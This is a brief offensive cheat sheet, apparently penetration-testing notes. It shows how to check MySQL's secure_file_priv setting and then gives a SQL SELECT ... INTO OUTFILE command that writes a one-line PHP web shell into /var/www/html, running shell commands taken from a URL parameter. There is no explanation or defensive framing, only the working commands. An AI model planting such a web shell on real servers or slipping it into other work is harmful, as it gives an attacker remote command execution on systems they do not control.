# checking privileges
```
show variables like "secure_file_priv";
```




# writing a webshell
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

